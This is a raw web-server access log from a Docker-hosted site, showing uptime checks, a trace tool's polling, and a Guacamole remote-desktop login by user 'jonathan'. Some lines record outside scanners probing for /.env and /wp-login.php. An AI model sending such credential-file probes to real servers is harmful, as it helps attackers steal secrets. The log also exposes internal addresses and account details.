159.203.109.206 - - [15/Dec/2023:20:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2054 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2055 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2056 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2057 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2058 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2059 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2060 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2061 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2062 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2063 "www@docker" "http://172.28.0.10:80" 1ms
134.209.158.44 - - [15/Dec/2023:20:39:39 +0000] "GET /wp-login.php HTTP/1.1" 301 17 "-" "-" 2064 "web-to-websecure@internal" "-" 0ms
134.209.158.44 - - [15/Dec/2023:20:39:40 +0000] "GET /wp-login.php HTTP/1.1" 403 0 "-" "-" 2065 "www@docker" "-" 29ms
205.210.31.60 - - [15/Dec/2023:20:39:57 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 2066 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:20:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2067 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2068 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2069 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2070 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2071 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2072 "www@docker" "http://172.28.0.10:80" 1ms
95.214.235.169 - - [15/Dec/2023:20:43:20 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2073 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:20:43:21 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2074 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:20:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2075 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2076 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2077 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2078 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2079 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2080 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2081 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2082 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2083 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2084 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2085 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2086 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2087 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:20:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2088 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2089 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2090 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2091 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:20:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2092 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2093 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2094 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2095 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2096 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2097 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2098 "www@docker" "http://172.28.0.10:80" 0ms
185.100.87.136 - - [15/Dec/2023:20:54:53 +0000] "POST /index.htm HTTP/1.1" 404 19 "-" "-" 2099 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:20:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2100 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2101 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2102 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2103 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:20:57:21 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2104 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:20:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2105 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:20:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2106 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2107 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2108 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2109 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2110 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2111 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2112 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2113 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2114 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2115 "www@docker" "http://172.28.0.10:80" 0ms
54.37.79.75 - - [15/Dec/2023:21:02:30 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2116 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:21:02:30 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2117 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:21:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2118 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2119 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2120 "www@docker" "http://172.28.0.10:80" 1ms
54.36.115.221 - - [15/Dec/2023:21:04:21 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2121 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [15/Dec/2023:21:04:21 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2122 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:21:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2123 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2124 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2125 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2126 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2127 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2128 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2129 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2130 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2131 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2132 "www@docker" "http://172.28.0.10:80" 0ms
172.59.216.49 - - [15/Dec/2023:21:09:08 +0000] "GET /trace/start.php?id=how9pykns HTTP/2.0" 200 103 "-" "-" 2133 "livetrace@docker" "http://172.28.0.5:80" 36ms
172.59.216.49 - - [15/Dec/2023:21:09:09 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2134 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.216.49 - - [15/Dec/2023:21:09:10 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2135 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.216.49 - - [15/Dec/2023:21:09:11 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2136 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.216.49 - - [15/Dec/2023:21:09:12 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2137 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.216.49 - - [15/Dec/2023:21:09:13 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2138 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.216.49 - - [15/Dec/2023:21:09:14 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2139 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.216.49 - - [15/Dec/2023:21:09:15 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2140 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.216.49 - - [15/Dec/2023:21:09:16 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2141 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.216.49 - - [15/Dec/2023:21:09:17 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2142 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.216.49 - - [15/Dec/2023:21:09:18 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2143 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.216.49 - - [15/Dec/2023:21:09:19 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2144 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.216.49 - - [15/Dec/2023:21:09:20 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2145 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.216.49 - - [15/Dec/2023:21:09:21 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2146 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.216.49 - - [15/Dec/2023:21:09:22 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2147 "livetrace@docker" "http://172.28.0.5:80" 2ms
159.203.109.206 - - [15/Dec/2023:21:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2148 "www@docker" "http://172.28.0.10:80" 1ms
172.59.216.49 - - [15/Dec/2023:21:09:23 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2149 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.216.49 - - [15/Dec/2023:21:09:24 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2150 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.216.49 - - [15/Dec/2023:21:09:25 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 43 "-" "-" 2151 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.216.49 - - [15/Dec/2023:21:09:26 +0000] "GET /trace/poll.php?id=how9pykns HTTP/2.0" 200 113 "-" "-" 2152 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.216.49 - - [15/Dec/2023:21:09:26 +0000] "GET /trace/cleanup.php?id=how9pykns HTTP/2.0" 200 71 "-" "-" 2153 "livetrace@docker" "http://172.28.0.5:80" 3ms
167.71.120.76 - - [15/Dec/2023:21:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2154 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2155 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2156 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:21:11:22 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2157 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:21:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2158 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2159 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2160 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2161 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2162 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2163 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2164 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2165 "www@docker" "http://172.28.0.10:80" 1ms
129.55.200.20 - - [15/Dec/2023:21:14:42 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2166 "www@docker" "http://172.28.0.10:80" 34ms
129.55.200.20 - - [15/Dec/2023:21:14:42 +0000] "GET /styles.css HTTP/2.0" 304 0 "-" "-" 2167 "www@docker" "http://172.28.0.10:80" 1ms
129.55.200.20 - - [15/Dec/2023:21:14:43 +0000] "GET /favicon.ico HTTP/2.0" 404 555 "-" "-" 2168 "www@docker" "http://172.28.0.10:80" 1ms
129.55.200.20 - - [15/Dec/2023:21:14:48 +0000] "GET /trace/ HTTP/2.0" 200 2248 "-" "-" 2169 "livetrace@docker" "http://172.28.0.5:80" 49ms
129.55.200.20 - - [15/Dec/2023:21:14:48 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 200 1304 "-" "-" 2170 "livetrace@docker" "http://172.28.0.5:80" 1ms
65.154.226.166 - - [15/Dec/2023:21:14:50 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2171 "web-to-websecure@internal" "-" 0ms
129.55.200.20 - - [15/Dec/2023:21:14:52 +0000] "GET /trace/start.php?id=caly5skpx HTTP/2.0" 200 103 "-" "-" 2172 "livetrace@docker" "http://172.28.0.5:80" 3ms
129.55.200.20 - - [15/Dec/2023:21:14:53 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2173 "livetrace@docker" "http://172.28.0.5:80" 2ms
129.55.200.20 - - [15/Dec/2023:21:14:54 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2174 "livetrace@docker" "http://172.28.0.5:80" 2ms
65.154.226.166 - - [15/Dec/2023:21:14:54 +0000] "GET / HTTP/1.1" 200 334 "-" "-" 2175 "www@docker" "http://172.28.0.10:80" 14ms
129.55.200.20 - - [15/Dec/2023:21:14:55 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2176 "livetrace@docker" "http://172.28.0.5:80" 1ms
129.55.200.20 - - [15/Dec/2023:21:14:56 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2177 "livetrace@docker" "http://172.28.0.5:80" 2ms
129.55.200.20 - - [15/Dec/2023:21:14:57 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2178 "livetrace@docker" "http://172.28.0.5:80" 2ms
129.55.200.20 - - [15/Dec/2023:21:14:58 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2179 "livetrace@docker" "http://172.28.0.5:80" 1ms
129.55.200.20 - - [15/Dec/2023:21:14:59 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2180 "livetrace@docker" "http://172.28.0.5:80" 1ms
129.55.200.20 - - [15/Dec/2023:21:15:00 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2181 "livetrace@docker" "http://172.28.0.5:80" 1ms
129.55.200.20 - - [15/Dec/2023:21:15:01 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2182 "livetrace@docker" "http://172.28.0.5:80" 2ms
129.55.200.20 - - [15/Dec/2023:21:15:02 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2183 "livetrace@docker" "http://172.28.0.5:80" 2ms
129.55.200.20 - - [15/Dec/2023:21:15:03 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2184 "livetrace@docker" "http://172.28.0.5:80" 2ms
129.55.200.20 - - [15/Dec/2023:21:15:04 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2185 "livetrace@docker" "http://172.28.0.5:80" 2ms
129.55.200.20 - - [15/Dec/2023:21:15:05 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2186 "livetrace@docker" "http://172.28.0.5:80" 2ms
129.55.200.20 - - [15/Dec/2023:21:15:06 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2187 "livetrace@docker" "http://172.28.0.5:80" 2ms
129.55.200.20 - - [15/Dec/2023:21:15:07 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2188 "livetrace@docker" "http://172.28.0.5:80" 2ms
129.55.200.20 - - [15/Dec/2023:21:15:08 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2189 "livetrace@docker" "http://172.28.0.5:80" 2ms
129.55.200.20 - - [15/Dec/2023:21:15:09 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 43 "-" "-" 2190 "livetrace@docker" "http://172.28.0.5:80" 2ms
129.55.200.20 - - [15/Dec/2023:21:15:10 +0000] "GET /trace/poll.php?id=caly5skpx HTTP/2.0" 200 113 "-" "-" 2191 "livetrace@docker" "http://172.28.0.5:80" 2ms
129.55.200.20 - - [15/Dec/2023:21:15:10 +0000] "GET /trace/cleanup.php?id=caly5skpx HTTP/2.0" 200 71 "-" "-" 2192 "livetrace@docker" "http://172.28.0.5:80" 3ms
159.203.109.206 - - [15/Dec/2023:21:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2193 "www@docker" "http://172.28.0.10:80" 1ms
129.55.200.20 - - [15/Dec/2023:21:15:27 +0000] "GET /trace/ HTTP/2.0" 200 2248 "-" "-" 2194 "livetrace@docker" "http://172.28.0.5:80" 4ms
129.55.200.20 - - [15/Dec/2023:21:15:33 +0000] "GET /guacamole/ HTTP/2.0" 304 0 "-" "-" 2195 "guacamole@docker" "http://172.28.0.9:8080" 171ms
129.55.200.20 - - [15/Dec/2023:21:15:33 +0000] "GET /guacamole/app.js?b=20230726134908 HTTP/2.0" 200 6482 "-" "-" 2197 "guacamole@docker" "http://172.28.0.9:8080" 17ms
129.55.200.20 - - [15/Dec/2023:21:15:33 +0000] "GET /guacamole/app.css?b=20230726134908 HTTP/2.0" 200 1987 "-" "-" 2196 "guacamole@docker" "http://172.28.0.9:8080" 17ms
129.55.200.20 - - [15/Dec/2023:21:15:34 +0000] "GET /guacamole/api/patches HTTP/2.0" 200 340 "-" "-" 2198 "guacamole@docker" "http://172.28.0.9:8080" 273ms
129.55.200.20 - - [15/Dec/2023:21:15:34 +0000] "GET /guacamole/api/languages HTTP/2.0" 200 244 "-" "-" 2199 "guacamole@docker" "http://172.28.0.9:8080" 285ms
129.55.200.20 - - [15/Dec/2023:21:15:34 +0000] "GET /guacamole/translations/en.json HTTP/2.0" 200 49963 "-" "-" 2201 "guacamole@docker" "http://172.28.0.9:8080" 4ms
129.55.200.20 - - [15/Dec/2023:21:15:34 +0000] "POST /guacamole/api/tokens HTTP/2.0" 403 257 "-" "-" 2200 "guacamole@docker" "http://172.28.0.9:8080" 1102ms
167.71.120.76 - - [15/Dec/2023:21:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2202 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2203 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2204 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2205 "www@docker" "http://172.28.0.10:80" 0ms
129.55.200.20 - - [15/Dec/2023:21:17:24 +0000] "POST /guacamole/api/tokens HTTP/2.0" 403 261 "-" "-" 2206 "guacamole@docker" "http://172.28.0.9:8080" 188ms
129.55.200.20 - - [15/Dec/2023:21:17:26 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2207 "guacamole@docker" "http://172.28.0.9:8080" 73ms
129.55.200.20 - - [15/Dec/2023:21:17:27 +0000] "DELETE /guacamole/api/session HTTP/2.0" 403 192 "-" "-" 2208 "guacamole@docker" "http://172.28.0.9:8080" 9ms
129.55.200.20 - - [15/Dec/2023:21:17:27 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2209 "guacamole@docker" "http://172.28.0.9:8080" 9ms
129.55.200.20 - - [15/Dec/2023:21:17:27 +0000] "GET /guacamole/api/session/data/mysql-shared/self/effectivePermissions HTTP/2.0" 200 228 "-" "-" 2213 "guacamole@docker" "http://172.28.0.9:8080" 109ms
129.55.200.20 - - [15/Dec/2023:21:17:27 +0000] "GET /guacamole/api/session/data/mysql-shared/connectionGroups/ROOT/tree HTTP/2.0" 200 123 "-" "-" 2211 "guacamole@docker" "http://172.28.0.9:8080" 110ms
129.55.200.20 - - [15/Dec/2023:21:17:27 +0000] "GET /guacamole/api/session/data/mysql/self/effectivePermissions HTTP/2.0" 200 685 "-" "-" 2212 "guacamole@docker" "http://172.28.0.9:8080" 357ms
129.55.200.20 - - [15/Dec/2023:21:17:27 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree HTTP/2.0" 200 1632 "-" "-" 2210 "guacamole@docker" "http://172.28.0.9:8080" 360ms
129.55.200.20 - - [15/Dec/2023:21:17:27 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 2216 "guacamole@docker" "http://172.28.0.9:8080" 31ms
129.55.200.20 - - [15/Dec/2023:21:17:27 +0000] "GET /guacamole/api/session/data/mysql/users/jonathan HTTP/2.0" 200 409 "-" "-" 2214 "guacamole@docker" "http://172.28.0.9:8080" 130ms
129.55.200.20 - - [15/Dec/2023:21:17:27 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 2215 "guacamole@docker" "http://172.28.0.9:8080" 142ms
129.55.200.20 - - [15/Dec/2023:21:17:32 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2217 "guacamole@docker" "http://172.28.0.9:8080" 7ms
129.55.200.20 - - [15/Dec/2023:21:17:32 +0000] "GET /guacamole/api/session/data/mysql/connections/5 HTTP/2.0" 200 296 "-" "-" 2218 "guacamole@docker" "http://172.28.0.9:8080" 54ms
129.55.200.20 - - [15/Dec/2023:21:17:33 +0000] "GET /guacamole/api/session/tunnels/e472d637-181b-3050-8d2c-ca0dacd24301/protocol HTTP/2.0" 200 2512 "-" "-" 2220 "guacamole@docker" "http://172.28.0.9:8080" 54ms
129.55.200.20 - - [15/Dec/2023:21:17:33 +0000] "GET /guacamole/api/session/tunnels/e472d637-181b-3050-8d2c-ca0dacd24301/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 2221 "guacamole@docker" "http://172.28.0.9:8080" 195ms
